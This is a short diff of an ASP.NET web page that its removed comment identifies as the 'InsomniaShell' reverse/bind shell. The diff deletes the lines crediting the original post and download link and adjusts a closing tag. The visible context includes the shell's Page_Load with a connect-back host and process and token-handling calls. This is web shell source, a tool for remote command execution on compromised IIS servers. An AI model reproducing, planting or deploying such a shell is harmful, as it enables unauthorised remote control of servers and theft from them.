@@ -5,9 +5,6 @@
 <%@ Import Namespace="System.Security.Principal" %>
 <%@ Import Namespace="System.Data.SqlClient" %>
 <script runat="server">
-//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
-//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
-    
 	protected void Page_Load(object sender, EventArgs e)
     {
 	    String host = "127.0.0.1";
@@ -420,4 +417,4 @@
         WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
         CloseHandle(DupeToken);
     }
-    </script>
+</script>
